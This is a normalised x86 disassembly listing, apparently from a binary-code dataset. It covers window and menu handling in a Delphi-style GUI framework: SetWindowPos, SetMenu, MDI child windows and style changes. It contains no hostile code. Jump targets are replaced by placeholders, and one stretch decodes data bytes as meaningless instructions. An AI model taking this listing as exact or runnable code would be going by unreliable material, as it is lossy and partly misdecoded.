mov eax [ ebp - 0x4 ]
cmp [ eax + 0x287 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x287 ] bl
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
setne al
xor al 0x1
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x288 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_496c14
test al al
je r-xdata
xor edx edx
push ebp
push sub_47aa34
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_497e0c
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_47adc4
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x287 ] 0x3
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x287 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x287 ] bl
cmp bl 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1e1 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47aef8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_48e120
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4930c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4795d4
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_497e0c
sub_47aa40
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x287 ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x36c ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x2a0 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x2ac ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_496868
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x36c ]
push eax
call SendMessageW
test bl bl
je r-xdata
call sub_46342c
mov edi eax
mov eax ebp
call sub_496868
push eax
call DrawMenuBar
sub_47aabc
push ebx
mov ebx edx
mov [ eax + 0x2b4 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_42e354
xor edx edx
mov eax ebx
call sub_465fb0
sub_47aae0
push ebx
mov ebx eax
cmp edx [ ebx + 0x2ac ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x2ac ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_47aa40
mov eax edx
mov edx ebx
call sub_42e354
sub_47ab08
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47ad1c
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x2a0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_47f684
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_467f64
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_47f670
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_42e354
mov [ ebx + 0x2a0 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_47f670
cmp esi [ eax + 0x2a0 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x11
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
mov eax ebx
call sub_496c14
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x286 ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_496868
push eax
call SetMenu
mov eax [ ebx + 0x2a0 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x281 ] 0x3
je r-xdata
mov eax ebx
call sub_47aa40
cmp [ ebx + 0x2a8 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
call sub_47c3d4
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x287 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ad23
lea eax [ ebp - 0x10 ]
call j_sub_449348
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x287 ] 0x1
je r-xdata
mov eax ebx
call sub_496c14
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax [ ebx + 0x2a0 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_496868
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_496868
push eax
call SetWindowPos
push 0x0
xor ecx ecx
mov edx 0x85
mov eax ebx
call sub_48f2b0
push 0x0
xor ecx ecx
mov edx 0xf
mov eax ebx
call sub_48f2b0
push 0x0
mov eax ebx
call sub_496868
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_496868
mov edx eax
mov eax esi
call sub_467f64
jmp r-xdata
mov eax [ ebx + 0x2a0 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_496868
push eax
call SetMenu
sub_47ad90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_47ad2c
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x2b0 ] esi
cmp [ ebx + 0x2b0 ] 0x0
je r-xdata
sub_47ade0
push ebx
mov ebx eax
cmp dl [ ebx + 0x338 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x338 ] dl
cmp dl 0x1
jne r-xdata
xor eax eax
mov [ ebx + 0x348 ] eax
xor eax eax
mov [ ebx + 0x34c ] eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
cmp [ ebx + 0x33c ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_47ae34
mov eax ebx
call sub_492ec4
sub_47ae34
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x33c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
je r-xdata
mov [ ebx + 0x33c ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_42e594
xor eax eax
mov [ ebx + 0x348 ] eax
xor eax eax
mov [ ebx + 0x34c ] eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_42e354
mov [ ebx + 0x338 ] 0x2
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_492ec4
sub_47aea4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_47ae98
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x2b0 ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x2b0 ] eax
sub_47af10
push ebx
mov ebx eax
mov eax ebx
call sub_495d94
cmp [ ebx + 0x1e1 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_47aef8
cmp eax [ ebx + 0x6c ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_47aef8
mov edx eax
mov eax ebx
call sub_48e120
mov edx 0xff00000f
mov eax ebx
call sub_48e120
pop ebx
retn
sub_47af94
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x283 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x283 ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1e2 ] 0x0
je r-xdata
movzx eax bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_496868
push eax
call ShowWindow
sub_47afd4
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov ebx eax
movzx eax [ ebx + 0x289 ]
test al al
je r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x40 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
movzx eax [ ebx + 0x289 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
call sub_47a7e8
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_47a7e8
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_47f654
dec eax
test eax eax
jl r-xdata
mov eax [ rw-data ]
call sub_4806e8
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x60 ]
call sub_47a7e8
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_47f640
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
cmp [ ebx + 0x288 ] 0x4
jne r-xdata
mov eax [ rw-data ]
call sub_47f654
mov edi eax
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_47f640
lea edx [ esp + 0x14 ]
call sub_47f314
mov eax [ ebx + 0x48 ]
push eax
mov edi [ ebx + 0x4c ]
push edi
lea eax [ esp + 0x1c ]
call sub_432a50
sub eax edi
sar eax 0x1
jns r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
add eax [ esp + 0x20 ]
push eax
lea eax [ esp + 0x20 ]
call sub_432a48
mov edx eax
sub edx [ ebx + 0x48 ]
sar edx 0x1
jns r-xdata
adc eax 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
movzx eax [ ebx + 0x288 ]
cmp al 0x4
jne r-xdata
add edx [ esp + 0x20 ]
mov eax ebx
pop ecx
mov edi [ eax ]
call [ edi + 0x88 ]
adc edx 0x0
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_47f640
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
jmp r-xdata
cmp al 0x6
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_47f640
lea edx [ esp + 0x14 ]
call sub_47f314
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
lea eax [ esp + 0x1c ]
call sub_432a50
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_47f640
call sub_47f27c
mov ebp eax
mov eax ebx
call sub_479168
add ebp eax
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_47f640
call sub_47f27c
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_47f640
call sub_47f27c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_47f640
call sub_47f2c8
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_47f640
call sub_47f2b0
push eax
mov edx esi
mov eax [ rw-data ]
call sub_47f640
call sub_47f294
sub eax ebp
sar eax 0x1
jns r-xdata
add eax [ esp + 0x20 ]
push eax
lea eax [ esp + 0x20 ]
call sub_432a48
mov edx eax
sub edx [ ebx + 0x48 ]
sar edx 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_47f640
call sub_47f2b0
push eax
mov eax ebx
call sub_479188
pop edx
add edx eax
push edx
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_47f640
call sub_47f2b0
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_47f640
call sub_47f2b0
push eax
mov edx esi
mov eax [ rw-data ]
call sub_47f640
call sub_47f294
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_47f640
call sub_47f27c
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_47f640
call sub_47f2c8
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_47f640
call sub_47f27c
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_47f640
call sub_47f2c8
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add edx [ esp + 0x20 ]
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x88 ]
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x88 ]
mov edx esi
mov eax [ rw-data ]
call sub_47f640
call sub_47f2b0
push eax
mov edx esi
mov eax [ rw-data ]
call sub_47f640
call sub_47f294
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x88 ]
jmp r-xdata
adc eax 0x0
sub_47b380
push ebx
push esi
mov esi eax
push esi
call GetParent
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
push 0xffffffec
push ebx
call GetWindowLongW
and eax 0x80
cmp eax 0x80
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov ebx [ eax + 0x40 ]
test ebx ebx
je r-xdata
push esi
call GetParent
mov ebx eax
mov eax [ rw-data ]
mov ebx [ eax + 0x170 ]
push 0xffffffec
mov eax ebx
call sub_496868
push eax
call GetWindowLongW
test al 0x80
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
call sub_496868
mov ebx eax
jmp r-xdata
sub_47b3f4
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_477cf8
mov edx edi
mov eax ebx
call sub_47e9e8
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov [ edi + 0x24 ] 0x8
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x1cc ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
xor esi esi
test [ ebx + 0x1c ] 0x10
je r-xdata
movzx eax [ ebx + 0x288 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
or [ edi + 0x4 ] 0xcf0000
jmp r-xdata
test [ ebx + 0x374 ] 0x8
je r-xdata
mov al 0x2
jmp r-xdata
lea eax [ edi + 0x24 ]
push eax
lea ecx [ edi + 0x8 ]
lea edx [ edi + 0x4 ]
mov eax ebx
mov si 0xffa9
call sub_4483f8
movzx eax [ ebx + 0x281 ]
cmp [ ebx + 0x287 ] 0x1
jne r-xdata
mov [ edi + 0xc ] 0x80000000
mov [ edi + 0x10 ] 0x80000000
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x287 ] 0x0
jne r-xdata
cmp [ ebx + 0x338 ] 0x0
jne r-xdata
mov ebp [ ebx + 0x348 ]
test ebp ebp
jne r-xdata
mov edx eax
sub dl 0x2
je r-xdata
mov edx eax
test dl dl
je r-xdata
xor eax eax
movzx eax [ ebx + 0x338 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebx + 0x34c ]
test eax eax
je r-xdata
cmp [ ebx + 0x34c ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
sub dl 0x3
jne r-xdata
mov al 0x2
sub dl 0x3
jne r-xdata
mov esi ebp
mov eax ebp
call sub_496868
mov [ edi + 0x1c ] eax
mov [ edi + 0x1c ] eax
jmp r-xdata
sub al 0x1
jb r-xdata
movzx edx [ ebx + 0x288 ]
sub dl 0x1
je r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
sub al 0x3
jae r-xdata
mov eax [ edi + 0x1c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x170 ]
je r-xdata
mov eax esi
call sub_47ad40
mov edx ebx
call sub_424744
test eax eax
jge r-xdata
test esi esi
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xcf ] 0x0
je r-xdata
je r-xdata
mov [ edi + 0x14 ] 0x80000000
mov [ edi + 0x18 ] 0x80000000
sub dl 0x2
jne r-xdata
mov [ ebx + 0x283 ] 0x0
test [ ebx + 0x1c ] 0x10
jne r-xdata
and [ edi + 0x4 ] 0xbffcffff
mov [ ebx + 0x34c ] eax
mov edx esi
mov eax ebx
call sub_42e354
mov [ ebx + 0x348 ] esi
jmp r-xdata
mov eax esi
call sub_47ad40
mov edx ebx
call sub_424590
mov eax [ rw-data ]
mov ebp [ eax + 0x170 ]
mov [ edi + 0x1c ] ebp
push 0xffffffec
push ebp
call GetWindowLongW
and eax 0xffffff7f
push eax
push 0xffffffec
push ebp
call SetWindowLongW
jmp r-xdata
cmp [ ebx + 0x360 ] 0x0
jne r-xdata
cmp [ ebx + 0x360 ] 0x0
je r-xdata
dec al
je r-xdata
cmp [ ebx + 0x287 ] 0x1
jne r-xdata
and [ edi + 0x4 ] 0xff3fffff
test [ ebx + 0x1d ] 0x2
je r-xdata
movzx eax [ ebx + 0x283 ]
cmp al 0x1
jne r-xdata
xor eax eax
mov [ edi + 0x1c ] eax
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x40 ]
jne r-xdata
mov eax [ rw-data ]
call sub_483bb8
mov [ edi + 0x1c ] eax
xor eax eax
mov [ edi + 0x1c ] eax
jmp r-xdata
mov ebp [ ebx + 0x33c ]
test ebp ebp
je r-xdata
jmp r-xdata
lea ecx [ edi + 0x8 ]
lea edx [ edi + 0x4 ]
mov eax ebx
mov si 0xffaa
call sub_4483f8
mov eax [ rw-data ]
cmp [ eax + 0xcf ] 0x0
je r-xdata
mov eax DefMDIChildProcW
mov [ edi + 0x28 ] eax
cmp al 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xcf ] 0x0
je r-xdata
mov eax [ rw-data ]
mov ebp [ eax + 0x40 ]
test ebp ebp
je r-xdata
mov ebp [ edi + 0x1c ]
test ebp ebp
je r-xdata
mov eax [ edi + 0x1c ]
call sub_4769b0
test eax eax
jne r-xdata
cmp [ edi + 0x1c ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_483c04
mov [ edi + 0x1c ] eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x360 ] 0x0
jne r-xdata
or [ edi + 0x4 ] 0x1000000
jmp r-xdata
or [ edi + 0x4 ] 0x20000000
jmp r-xdata
cmp [ ebx + 0x360 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x170 ]
mov [ edi + 0x1c ] eax
jmp r-xdata
mov eax ebp
call sub_496c14
test al al
je r-xdata
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
push 0xffffffec
push ebp
call GetWindowLongW
and eax 0x80
cmp eax 0x80
jne r-xdata
xor eax eax
mov [ edi + 0x1c ] eax
mov eax [ edi + 0x1c ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
test eax eax
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x40 ] 0x0
je r-xdata
mov eax ebp
call sub_496868
mov [ edi + 0x1c ] eax
mov esi [ ebx + 0x33c ]
jmp r-xdata
or [ edi + 0x8 ] 0x40000
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0xd8 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
call sub_483c04
mov ebp eax
mov [ edi + 0x1c ] ebp
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
call sub_496868
cmp ebp eax
jne r-xdata
test eax eax
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x64 ] 0x0
je r-xdata
mov eax [ edi + 0x1c ]
call sub_47b380
mov [ edi + 0x1c ] eax
mov eax [ edi + 0x1c ]
push eax
call IsWindowEnabled
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov ebp [ eax + 0x170 ]
mov [ edi + 0x1c ] ebp
mov eax [ rw-data ]
cmp [ eax + 0xcf ] 0x0
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x40 ]
cmp eax [ edx + 0x24c ]
jne r-xdata
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
cmp [ ebx + 0x287 ] 0x1
je r-xdata
test [ ebx + 0x55 ] 0x20
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
call sub_47ad40
mov edx ebx
call sub_424744
test eax eax
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xcf ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x64 ]
cmp eax [ edx + 0x24c ]
jne r-xdata
push 0xffffffec
push ebp
call GetWindowLongW
and eax 0xffffff7f
push eax
push 0xffffffec
push ebp
call SetWindowLongW
jmp r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x40 ]
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x40 ]
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x40 ]
mov eax ebx
call sub_42e354
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
call sub_47ad40
mov edx ebx
call sub_424590
mov eax [ rw-data ]
mov ebp [ eax + 0x170 ]
mov [ edi + 0x1c ] ebp
push 0xffffffec
push ebp
call GetWindowLongW
and eax 0xffffff7f
push eax
push 0xffffffec
push ebp
call SetWindowLongW
jmp r-xdata
cmp [ ebx + 0x360 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
jmp r-xdata
xor eax eax
mov [ edi + 0x1c ] eax
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x40 ]
jne r-xdata
mov eax [ rw-data ]
mov ebp [ eax + 0x40 ]
test ebp ebp
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x170 ]
mov [ edi + 0x1c ] eax
jmp r-xdata
mov eax ebp
call sub_496c14
test al al
je r-xdata
mov eax [ rw-data ]
call sub_483c04
mov ebp eax
mov [ edi + 0x1c ] ebp
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
call sub_496868
cmp ebp eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
call sub_47ad40
mov edx ebx
call sub_424744
test eax eax
jge r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x40 ]
mov eax ebx
call sub_42e354
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
call sub_47ad40
mov edx ebx
call sub_424590
sub_47b980
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_477d08
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x281 ] 0x3
je r-xdata
mov eax [ ebx + 0x340 ]
test eax eax
je r-xdata
movzx eax [ ebx + 0x287 ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_496868
push eax
call SendMessageW
mov eax ebx
call sub_47c548
push eax
push 0x1
push 0x80
mov eax ebx
call sub_496868
push eax
call SendMessageW
jmp r-xdata
mov eax [ ebx + 0x344 ]
call sub_44af30
mov edi eax
test edi edi
jl r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x2ac ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x0
lea eax [ ebx + 0x344 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
test [ ebx + 0x1c ] 0x1
jne r-xdata
inc edi
xor esi esi
mov eax [ ebx + 0x340 ]
mov edx [ eax ]
call [ edx + 0x8 ]
inc edi
xor esi esi
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_48d878
push eax
mov eax ebx
call sub_48d8bc
push eax
mov eax ebx
call sub_496868
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_41d3e0
mov [ ebx + 0x36c ] eax
push ebx
push sub_479db8
call sub_476e58
mov [ ebx + 0x370 ] eax
push 0xfffffffc
mov eax [ ebx + 0x36c ]
push eax
call GetWindowLongW
mov [ ebx + 0x2c8 ] eax
mov eax [ ebx + 0x370 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x36c ]
push eax
call SetWindowLongW
jmp r-xdata
mov eax esi
call sub_46342c
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_496868
push eax
call SetWindowPos
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x364 ]
call sub_483fc4
test al al
je r-xdata
mov eax [ ebx + 0x24c ]
push eax
mov eax [ ebx + 0x344 ]
mov eax [ eax + esi * 8 ]
push eax
push 0xb049
mov eax [ ebx + 0x344 ]
mov eax [ eax + esi * 8 + 0x4 ]
push eax
call SendMessageW
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x340 ]
call sub_4246e8
call sub_4930c8
inc esi
dec edi
jne r-xdata
xor edx edx
mov eax ebx
call sub_47ea9c
sub_47bb66
add [ eax ] al
dec ebp
add [ eax + eax + 0x49 ] al
add [ ebx ] al
dec esp
add [ ecx ] cl
inc ebp
add [ esi ] cl
push esp
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff0c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xf4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_47bca4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x287 ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xf0 ]
mov ecx 0x33
[ edi ] [ esi ]
and [ ebp - 0xe8 ] 0xfff7ffff
lea edx [ ebp - 0xf0 ]
mov eax ebx
call sub_4929c0
and [ ebx + 0x374 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xf4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0xf4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
cmp [ eax + 0x36c ] 0x0
jne r-xdata
mov eax ebx
call sub_47e898
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bcab
lea eax [ ebp - 0xf4 ]
call j_sub_449348
retn
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x36c ]
xor ecx ecx
mov edx 0x220
call sub_41f0dc
mov [ ebx + 0x24c ] eax
or [ ebx + 0x374 ] 0x10
jmp r-xdata
sub_47bcb4
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
